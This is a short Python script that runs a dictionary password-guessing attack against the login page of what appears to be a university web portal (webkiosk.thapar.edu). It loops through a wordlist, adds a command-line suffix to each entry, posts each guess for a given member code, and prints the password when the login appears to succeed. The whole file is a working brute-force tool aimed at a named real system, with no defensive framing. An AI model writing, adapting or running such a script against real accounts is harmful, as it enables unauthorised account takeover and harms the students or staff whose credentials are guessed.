import sys
import requests
from bs4 import BeautifulSoup as bs

url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'

def connect(url, m_data):
	# print("requesting data:")
	resp = requests.post(url, data=m_data)
	# print("parsing data:")
	soup = bs(resp.text, 'html.parser')
	# print("checking data:")
	x = soup.find_all('frame')
	if(len(x) != 0):
		print("Password is " + m_data["Password"])
		sys.exit()
	# print("done")

def controller():
	psswds = open('new_dict').read().split('\n')
	for i, line in enumerate(psswds):
		print(f'\rTrying {line + sys.argv[2]} | {i} of {len(psswds)}', end='', flush=True)
		connect(url, {
			'UserType' : 'P',
			'MemberCode' : sys.argv[1],
			'Password' : line + sys.argv[2]
		})

controller()